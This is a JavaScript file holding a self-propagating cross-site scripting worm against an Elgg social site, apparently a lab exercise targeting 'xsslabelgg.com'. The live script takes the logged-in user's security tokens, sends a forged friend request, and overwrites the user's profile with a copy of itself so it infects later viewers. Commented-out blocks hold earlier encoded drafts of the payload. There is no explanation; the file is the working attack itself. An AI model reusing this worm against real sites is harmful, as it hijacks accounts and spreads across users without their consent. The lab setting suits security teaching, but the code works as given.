<script id= "worm" type = "text/javascript">
var user = null;
user = elgg.get_logged_in_user_entity();
var ts = elgg.security.token.__elgg_ts;
var token = elgg.security.token.__elgg_token;

var Ajaxg = new XMLHttpRequest();
Ajaxg=new XMLHttpRequest();
Ajaxg.open("GET","http://www.xsslabelgg.com/action/friends/add?friend=42&__elgg_ts=".concat(ts).concat("&__elgg_token=").concat(token),true);
Ajaxg.setRequestHeader("Host","www.xsslabelgg.com");
Ajaxg.setRequestHeader("Keep-Alive","300");
Ajaxg.setRequestHeader("Connection","keep-alive");
Ajaxg.setRequestHeader("Cookie",document.cookie);
Ajaxg.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajaxg.send()


var Ajax=null;
Ajax=new XMLHttpRequest();
Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Keep-Alive","300");
Ajax.setRequestHeader("Connection","keep-alive");
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
var selfprop ="<script id='worm' type ='text/javascript'>".concat(escape(document.getElementById("worm").innerHTML)).concat("</").concat("script>");
var content = "__elgg_token=".concat(token).concat("&__elgg_ts=").concat(ts).concat("&name=").concat(user.name).concat("&description=").concat(selfprop).concat("%3C%2Fp%3E&accesslevel%5Bdescription%5D=2&briefdescription=&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2&guid=").concat(user.guid);
Ajax.send(content);
</script>


/*"__elgg_token="+token+"&__elgg_ts="+ts+"&name="+user.name+"&description=%3Cp%3EAAAAAAAAAAAAAAAAA%3C%2Fp%3E&accesslevel%5Bdescription%5D=2&briefdescription=&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2&guid=+user.guid*/




/*"__elgg_token="+token+"&__elgg_ts="+ts+"&name="+user.name+"&description=%3Cscript%3E%0D%0Avar+user+%3D+null%3B%0D%0Auser+%3D+elgg.get_logged_in_user_entity%28%29%3B%0D%0Avar+ts+%3D+elgg.security.token.__elgg_ts%3B%0D%0Avar+token+%3D+elgg.security.token.__elgg_token%3B%0D%0Avar+Ajax%3Dnull%3B%0D%0AAjax%3Dnew+XMLHttpRequest%28%29%3B%0D%0AAjax.open%28%22POST%22%2C%22http%3A%2F%2Fwww.xsslabelgg.com%2Faction%2Fprofile%2Fedit%22%2Ctrue%29%3B%0D%0AAjax.setRequestHeader%28%22Host%22%2C%22www.xsslabelgg.com%22%29%3B%0D%0AAjax.setRequestHeader%28%22Keep-Alive%22%2C%22300%22%29%3B%0D%0AAjax.setRequestHeader%28%22Connection%22%2C%22keep-alive%22%29%3B%0D%0AAjax.setRequestHeader%28%22Cookie%22%2Cdocument.cookie%29%3B%0D%0AAjax.setRequestHeader%28%22Content-Type%22%2C%22application%2Fx-www-form-urlencoded%22%29%3B%0D%0Avar+content+%3D%22%22%3B%0D%0AAjax.send%28content%29%3B%0D%0A%3C%2Fscript%3E&accesslevel%5Bdescription%5D=2&briefdescription=&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2&guid="+user.guid*/




/*"__elgg_token="+token+"&__elgg_ts="+ts+"&name="+user.name+"&description=%3Cscript+type%3D%22text%2Fjavascript%22%3E%0D%0Avar+worm+%3D+function%28%29%0D%0A%7B%0D%0Avar+content%3D%22INSERT+CONTENT+FOR+ABOUT+ME+HERE%22%3B%0D%0A%7D%0D%0Avar+user+%3D+null%3B%0D%0Auser+%3D+elgg.get_logged_in_user_entity%28%29%3B%0D%0Avar+ts+%3D+elgg.security.token.__elgg_ts%3B%0D%0Avar+token+%3D+elgg.security.token.__elgg_token%3B%0D%0Avar+Ajax%3Dnull%3B%0D%0AAjax%3Dnew+XMLHttpRequest%28%29%3B%0D%0AAjax.open%28%22POST%22%2C%22http%3A%2F%2Fwww.xsslabelgg.com%2Faction%2Fprofile%2Fedit%22%2Ctrue%29%3B%0D%0AAjax.setRequestHeader%28%22Host%22%2C%22www.xsslabelgg.com%22%29%3B%0D%0AAjax.setRequestHeader%28%22Keep-Alive%22%2C%22300%22%29%3B%0D%0AAjax.setRequestHeader%28%22Connection%22%2C%22keep-alive%22%29%3B%0D%0AAjax.setRequestHeader%28%22Cookie%22%2Cdocument.cookie%29%3B%0D%0AAjax.setRequestHeader%28%22Content-Type%22%2C%22application%2Fx-www-form-urlencoded%22%29%3B%0D%0Acontent+%3D+%22%22%2Bworm%3B%0D%0AAjax.send%28content%29%3B%0D%0A%3C%2Fscript%3E&accesslevel%5Bdescription%5D=2&briefdescription=&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2&guid="+user.guid*/
